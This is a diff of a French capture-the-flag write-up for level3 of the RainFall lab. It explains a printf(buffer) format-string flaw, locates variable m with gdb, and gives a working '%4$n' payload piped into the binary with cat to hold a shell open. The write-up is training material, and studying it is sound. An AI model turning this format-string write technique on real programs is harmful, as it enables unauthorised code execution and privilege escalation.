@@ -1,8 +1,7 @@
-https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf
-
 (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
 
 Nous avons un binaire avec un printf qui imprime directement ce que le programme reçoit dans un fgets précédent.
+Nous allons utiliser les format strings pour écrire sur la variable m, car ici printf(buffer).
 
 Avec un input : "%s" => Segmentation_fault
 Avec un input : "%x" => on affiche le premier emplacement mémoire de la pile
@@ -24,7 +23,7 @@ gdb -q level3
 info variables
 => 0x0804988c  m
 
-on est en little endian donc adresse à eécrire sous la forme :
+on est en little endian donc adresse à écrire sous la forme :
 \x8c\x98\x04\x08
 
 ce qui nous donne comme payload :
@@ -33,9 +32,9 @@ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' | ./level3
 => �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 
-it seems that we went to the good place but stdin closed itself
+Il semble que nous sommes allés au bon endroit mais que stdin s'est refermé
 
-a little cat should do it : 
+ajoutons un cat pour garder stdin ouvert : 
 (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
 
 level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
